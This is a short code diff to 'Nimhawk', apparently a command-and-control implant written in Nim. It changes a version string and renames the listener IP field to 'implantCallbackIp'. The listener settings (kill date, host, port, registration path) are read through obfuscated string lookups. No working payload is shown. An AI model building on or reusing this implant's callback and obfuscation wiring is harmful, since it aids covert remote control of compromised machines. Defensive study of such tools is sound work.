@@ -31,7 +31,7 @@ when defined risky:
 # Parse the configuration at compile-time
 let CONFIG : Table[string, string] = configParser.parseConfig()
 
-const version: string = "Nimhawk v1.0"
+const version: string = "=== Nimhawk v1.0 ==="
 
 # IMPORTANT: Export runNp correctly
 proc runNp() {.exportc, cdecl.} =
@@ -41,7 +41,7 @@ proc runNp() {.exportc, cdecl.} =
     var listener = Listener(
         killDate: CONFIG[obf("killDate")],
         listenerHost: CONFIG[obf("hostname")],
-        listenerIp: CONFIG[obf("listenerIp")],
+        implantCallbackIp: CONFIG[obf("implantCallbackIp")],
         listenerPort: CONFIG[obf("listenerPort")],
         listenerType: CONFIG[obf("listenerType")],
         registerPath: CONFIG[obf("listenerRegPath")],
